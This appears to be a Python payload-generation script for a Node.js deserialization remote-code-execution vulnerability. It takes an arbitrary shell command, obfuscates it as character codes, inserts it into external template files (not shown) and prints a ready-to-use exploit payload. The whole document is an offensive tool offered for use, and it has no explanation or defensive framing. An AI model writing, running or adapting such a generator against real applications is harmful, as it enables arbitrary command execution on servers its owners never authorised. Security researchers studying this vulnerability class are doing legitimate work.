# Payload generation script for NodeJS deserialization vulnerability
# Coded by - Nehal Zaman (@pwnersec)

from termcolor import colored
from banner import banner


TEMPLATE = "template/template.txt"
NODEJS_RCE = "template/nodejs_rce.txt"


def encode_cmd(cmd):

	with open(NODEJS_RCE, "r") as rf:

		cmd = rf.read().replace("$$PAYLOAD$$", cmd)

	output = ""

	for char in cmd:

		output += f",{ord(char)}"

	return output[1:]


def make_payload(cmd):

	with open(TEMPLATE, "r") as rf:

		payload = rf.read().replace("$$PAYLOAD$$", cmd)

	return payload


if __name__ == "__main__":

	print(colored(banner, "yellow"))

	raw_cmd = input(colored("Enter your command >> ", "blue"))

	encoded_cmd = encode_cmd(raw_cmd)
	
	payload = make_payload(encoded_cmd)

	print(f"{colored('Your payload:', 'blue')} {colored(payload, 'green')}")